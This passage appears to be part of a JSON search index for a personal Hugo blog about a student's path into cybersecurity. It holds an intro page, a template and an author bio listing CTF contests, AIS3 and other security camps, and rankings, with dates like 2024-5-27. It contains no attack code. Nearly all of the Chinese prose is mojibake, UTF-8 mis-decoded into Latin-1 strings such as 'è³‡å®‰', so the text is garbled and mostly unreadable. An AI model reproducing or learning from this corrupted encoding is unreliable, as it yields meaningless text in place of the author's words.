¼è£¡\nå‰›å¥½æƒ³èªªå¯ä»¥å‰µå€‹åœ°æ–¹ä¾†è®“æˆ‘å¯«å„ç¨®è³‡å®‰ç›¸é—œçš„ç¶“æ­·\nå› æ­¤é€™å€‹ç¶²ç«™ä¸»è¦å…§å®¹ä¹Ÿæ¯”è¼ƒéƒ½æœƒæ˜¯ä»¥æˆ‘çš„å„ç¨®è³‡å®‰ç›¸é—œç¶“æ­·ç‚ºä¸»\nç¶²ç«™ç°¡ä»‹ #\ré€™å€‹ç¶²ç«™æ˜¯é€é\rHugo å»ºç«‹ï¼Œä¸¦å¥—ç”¨äº†\rblowfish ä¸»é¡Œ\nç„¶å¾Œæˆ‘å…¶å¯¦å¾ˆä¸æœƒå¯«ç¶²ç«™ æ­¡è¿å„ä½å¤§ç¥æŒ‡å°æˆ‘\nç¶²ç«™æ­·å² #\r2024-5-27 ç¶²ç«™å‰µç«‹\n","date":"31 May 2024","externalUrl":null,"permalink":"/intro/","section":"betan423.github.io","summary":"çœ‹çœ‹æˆ‘ã„‰éƒ¨è½æ ¼æ­·å²ã€‚","title":"ç¶²ç«™ç°¡ä»‹","type":"page"},{"content":"\rå‰¯æ¨™é¡Œ\ræ®µè½æ¨™é¡Œ #\ræ›è¡Œ åœ–ç‰‡ ","date":"23 April 2005","externalUrl":null,"permalink":"/%E9%A0%90%E8%A8%AD/","section":"betan423.github.io","summary":"è¤‡è£½ç”¨æ¨¡æ¿","title":"æ¨¡æ¿","type":"page"},{"content":"","date":"1 January 0001","externalUrl":null,"permalink":"/authors/","section":"Authors","summary":"","title":"Authors","type":"authors"},{"content":"","date":"1 January 0001","externalUrl":null,"permalink":"/categories/","section":"Categories","summary":"","title":"Categories","type":"categories"},{"content":"","date":"1 January 0001","externalUrl":null,"permalink":"/series/","section":"Series","summary":"","title":"Series","type":"series"},{"content":"\rçœ‹çœ‹æˆ‘çµ¦æœªä¾†çš„è‡ªå·±ç•«äº†å¤šå°‘é¤…\rè³‡å®‰ç›¸é—œè¦åŠƒ #\ræˆ‘çš„æœªä¾†\nä¸€ ç‰‡ è¿· èŒ«\n","date":"1 January 0001","externalUrl":null,"permalink":"/future/","section":"betan423.github.io","summary":"æˆ‘ã„‰æœªä¾†è¦åŠƒã€‚","title":"æœªä¾†è¦åŠƒ","type":"page"},{"content":"\né€™æˆ‘ #\rå—¨æˆ‘æ˜¯è²å¦ï¼Œä¸€å€‹èª¤æ‰“èª¤æ’è·‘å»å­¸è³‡å®‰çš„æ€ªäºº\nç•¶åˆå°æ–¼è³‡å®‰é€™å¡Šå®Œå…¨æ²’æ¦‚å¿µï¼Œä½†å¤§å­¸ä¸å°å¿ƒä¸Šäº†ä¸€å€‹åå­å¾ˆé•·çš„è³‡å®‰ç³»ï¼Œ åœ¨ç¶“éä¸€å­¸æœŸçš„å„ç¨®è¬›åº§æ´—ç¦®ä»¥åŠè‡ªå·±ç¨å¾®äº†è§£å¾Œï¼Œç™¼ç¾å°æ–¼è³‡å®‰å¥½åƒæ»¿æœ‰èˆˆè¶£çš„ï¼Œ çµæœå°±æ ½é€²é€™å€‹ç„¡åº•æ´äº†ã€‚\nè³‡å®‰ç¶“é©— #\r2024-4 åŠ å…¥B33F 50Î¼Pæˆ°éšŠ\n2024-8 åƒèˆ‡2024 AIS3\n2024-8 è‡ºç£å¥½å²é§­ç¬¬ä¹å±†\n2025-1 åƒåŠ TeamT5 camp\nç«¶è³½ç¶“é©— #\r2024 My First CTF éŠ€è³ªç/ç¬¬5å\n2024 AIS3 æœ€ä½³å°ˆé¡Œç\næ‰€æœ‰å¥‡æ€ªç¶“æ­· #\r2024 #\r1æœˆ #\rEOFåˆè³½\nTSC CTF 47å\n3æœˆ #\rç·šä¸Šè³‡å®‰äººåŠ›éœ€æ±‚å°è«‡-æ™ºæ…§è£½é€ ç”¢æ¥­\nç¶²è·¯é€šä¿¡ç”¢æ¥­è·¨åŸŸè³‡å®‰äººåŠ›é«˜å³°è«–å£‡\npico CTF 2666/6957\n4æœˆ #\rTHJCC CTF 14/108\n5æœˆ #\råœ‹éš›è³‡å®‰å¤§æœƒ\nAIS3 Pre-Exam\nAIS3 MyFirstCTF\n6æœˆ #\rBCACTF DownUnderCTF\n7æœˆ #\rAIS3\n8æœˆ #\rAIS3\nFinTech Summer CAMP é‡‘èç”¢æ¥­è³‡å®‰å¯¦å‹™ç ”ç¿’ç‡Ÿ\nAIS3 club\nHITCON\nNISRA enlghtenedæ“”ä»»pwnèª²ç¨‹çš„è¬›å¸«\nè‡ºç£å¥½å²é§­ç¬¬9å±†é«˜éšåŸ¹è¨“\n9æœˆ #\rç¥ç›¾ç›ƒ 19å\n10æœˆ #\ré‡‘ç›¾ç åˆè³½\n11æœˆ #\rGCCG 39å\n12æœˆ #\r2025 #\r1æœˆ #\rTeam T5 camp\n","date":"1 January 0001","externalUrl":null,"permalink":"/authors/betan/","section":"Authors","summary":"","title":"æˆ‘æ˜¯è²å¦betan","type":"authors"}]